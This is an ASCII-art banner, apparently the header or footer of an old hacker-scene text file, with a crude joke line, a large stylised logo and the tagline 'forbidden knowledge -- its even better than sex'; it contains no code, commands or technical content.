+:: rectum shall feel the sting of a thousand chilli-burgers! =) h0h. ph34r.   ::
+::									      ::
+::                           :    ____                                        ::
+::                         i..?W$$$$$$$          __                           ::
+::                        ;Q$$P"    $$$        ;$$$                           ::
+::                      .$$$;'      $$$        I$$$                           ::
+::                     I$$. :       $$$        $$$;                           ::
+::                    ;$I?  .       $$$    _..$$$;                            ::
+::                    $$$;          $$$y#Q$$$$$P'                             ::
+::                    $$$           $$$P""^^                                  ::
+::               _____$$$           $$$;                                      ::
+::               $$$$$$$$$$$$$$     `$$$y,                                    ::
+::               ''^""$$$^^""""     ;,"?$$$#,                                 ::
+::                    $$$           I$#  ^$$$$,                               ::
+::                    $$y,          $$$    ?$$$;                              ::
+::                    $$$;          $$$    ;$$$I                              ::
+::                       :          $$$     $$$$                              ::
+::                       .                  $$$$                              ::
+::                                                                            ::
+::            forbidden knowledge -- its even better than sex                 ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
